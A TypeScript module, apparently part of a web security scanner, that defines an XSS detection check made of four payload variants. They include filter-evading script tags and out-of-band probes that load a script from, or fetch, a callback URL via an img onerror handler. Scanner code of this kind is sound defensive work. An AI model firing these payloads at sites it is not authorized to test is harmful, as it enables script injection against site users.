// XSS Oracle (OAST-confirmed XSS) active check family.
import type { PayloadVariant, MutationContext } from '../types';

export const META = {
  id: 'xss-oracle',
  family: 'xss-oracle' as const,
  name: 'XSS (Oracle)',
  description: 'Detects XSS via OAST-confirmed out-of-band callback from injected script tags.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['query', 'body', 'json', 'header'],
};

export function variants(ctx: MutationContext): PayloadVariant[] {
  const base = ctx.oastBaseUrl && ctx.oastToken
    ? `https://${ctx.oastToken}.${ctx.oastBaseUrl}/`
    : null;

  const probes: PayloadVariant[] = [
    {
      id: 'xss-oracle-1', family: 'xss-oracle' as const,
      value: '<script>document.write(String.fromCharCode(60,83,67,82,73,80,84,62))</script>',
      encoding: 'raw' as const,
      intent: 'Encoded script injection to evade simple pattern filters',
      requiresOast: false, requiresBrowser: false,
      destructiveRisk: 'none' as const,
      expectedSignals: ['xss-reflected'],
    },
    {
      id: 'xss-oracle-2', family: 'xss-oracle' as const,
      value: '<ScRiPt>alert(1)</ScRiPt>',
      encoding: 'raw' as const,
      intent: 'Mixed-case script tag to bypass case-sensitive filters',
      requiresOast: false, requiresBrowser: false,
      destructiveRisk: 'none' as const,
      expectedSignals: ['xss-reflected'],
    },
  ];

  if (base) {
    probes.push({
      id: 'xss-oracle-oast-1', family: 'xss-oracle' as const,
      value: `<script src="${base}xss.js"></script>`,
      encoding: 'raw' as const,
      intent: 'External script load via OAST URL — confirms browser execution',
      requiresOast: true, requiresBrowser: true,
      destructiveRisk: 'none' as const,
      expectedSignals: ['oast-callback-confirmed'],
    });
    probes.push({
      id: 'xss-oracle-oast-2', family: 'xss-oracle' as const,
      value: `<img src=x onerror="fetch('${base}xss')">`,
      encoding: 'raw' as const,
      intent: 'Fetch OAST in onerror handler — confirms script execution without eval',
      requiresOast: true, requiresBrowser: false,
      destructiveRisk: 'none' as const,
      expectedSignals: ['oast-callback-confirmed'],
    });
  }

  return probes;
}
